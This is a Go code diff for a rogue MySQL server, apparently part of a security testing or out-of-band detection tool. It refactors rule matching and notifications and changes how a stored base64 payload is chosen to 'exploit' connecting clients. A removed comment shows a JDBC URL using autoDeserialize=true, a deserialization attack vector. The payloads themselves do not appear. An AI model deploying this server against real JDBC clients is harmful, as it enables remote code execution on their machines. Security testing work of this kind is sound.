@@ -68,11 +68,10 @@ func (s *Server) NewConnection(c *vmysql.Conn) {
 		user      = c.User
 		schema    = c.SchemaName
 		validated bool
-		flag      string
 	)
 
 	for _, _rule := range s.getRules() {
-		flag, _, _ = _rule.Match(user)
+		flag, flagGroup, vars := _rule.Match(user)
 		if flag == "" {
 			flag, _, _ = _rule.Match(schema)
 		}
@@ -82,6 +81,9 @@ func (s *Server) NewConnection(c *vmysql.Conn) {
 		log.Trace("MySQL connection[id: %d] matched rule[rule_name: %s, flag: %s]", c.ConnectionID, _rule.Name, flag)
 		s.connRulePool.Store(c.ConnectionID, _rule)
 		validated = true
+		c.Flag = flag
+		c.FlagGroup = flagGroup
+		c.Vars = vars
 		break
 	}
 	if !validated {
@@ -103,7 +105,6 @@ func (s *Server) ConnectionClosed(c *vmysql.Conn) {
 	var clientName, clientOS, flag, flagGroup string
 
 	user := c.User
-	schema := c.SchemaName
 	supportLoadLocalData := c.SupportLoadDataLocal
 
 	cr, ok := s.connRulePool.Load(c.ConnectionID)
@@ -113,13 +114,6 @@ func (s *Server) ConnectionClosed(c *vmysql.Conn) {
 	}
 
 	_rule := cr.(*Rule)
-	// flag must not be empty
-	for _, s := range []string{user, schema} {
-		flag, flagGroup, _ = _rule.Match(s)
-		if flag != "" {
-			break
-		}
-	}
 
 	if c.ConnAttrs != nil {
 		clientName = c.ConnAttrs["_client_name"] + " " + c.ConnAttrs["_client_version"]
@@ -143,27 +137,31 @@ func (s *Server) ConnectionClosed(c *vmysql.Conn) {
 	}
 	log.Info("MySQL record[id:%d rule:%s remote_ip:%s] has been created", r.ID, _rule.Name, ip)
 
-	//only send to client when this connection recorded first time.
-	if _rule.PushToClient {
-		if flagGroup != "" {
-			var count int64
-			database.DB.Where("rule_name=? and (user like ? or schema like ?)", _rule.Name, "%"+flagGroup+"%", "%"+flagGroup+"%").Model(&Record{}).Count(&count)
-			if count <= 1 {
-				r.PushToClient()
-				log.Trace("MySQL record[id:%d, flagGroup:%s] has been put to client message queue", r.ID, flagGroup)
-			}
-		} else {
-			r.PushToClient()
-			log.Trace("MySQL record[id:%d, flag:%s] has been put to client message queue", r.ID, flag)
-		}
+	//only send to client or notify user when this connection recorded first time.
+	var count int64
+	if c.FlagGroup != "" {
+		database.DB.Where("rule_name=? and (user like ? or schema like ?)", _rule.Name, "%"+flagGroup+"%", "%"+flagGroup+"%").Model(&Record{}).Count(&count)
 	}
-
-	//send notice
-	if _rule.Notice {
-		go func() {
-			r.Notice()
-			log.Trace("MySQL record[id: %d] notice has been sent", r.ID)
-		}()
+	if count <= 1 {
+		if _rule.PushToClient {
+			r.PushToClient()
+			if flagGroup != "" {
+				log.Trace("MySQL record[id:%d, flagGroup:%s] has been put to client message queue", r.ID, flagGroup)
+			} else {
+				log.Trace("MySQL record[id:%d] has been put to client message queue", r.ID)
+			}
+		}
+		//send notice
+		if _rule.Notice {
+			go func() {
+				r.Notice()
+				if flagGroup != "" {
+					log.Trace("MySQL record[id:%d, flagGroup:%s] notice has been sent", r.ID, flagGroup)
+				} else {
+					log.Trace("MySQL record[id: %d] notice has been sent", r.ID)
+				}
+			}()
+		}
 	}
 
 	s.connRulePool.Delete(c.ConnectionID)
@@ -203,12 +201,13 @@ func (s *Server) ComQuery(c *vmysql.Conn, query string, callback func(*sqltypes.
 			})}
 
 			//choose payload
-			//jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true
-			if c.ConnAttrs["t"] != "" && _rule.Payloads[c.ConnAttrs["t"]] != "" {
-				payload, _ = base64.StdEncoding.DecodeString(_rule.Payloads[c.ConnAttrs["t"]])
+			if c.Vars["payload"] != "" && _rule.Payloads[c.Vars["payload"]] != "" {
+				payload, _ = base64.StdEncoding.DecodeString(_rule.Payloads[c.Vars["payload"]])
+				log.Trace("MySQL exploit client [%d] with payload [%s]", c.ConnectionID, c.Vars["payload"])
 			} else {
-				for _, v := range _rule.Payloads {
+				for k, v := range _rule.Payloads {
 					payload, _ = base64.StdEncoding.DecodeString(v)
+					log.Trace("MySQL not found payload variable, exploit client [%d] with payload [%s]", c.ConnectionID, k)
 					break
 				}
 			}
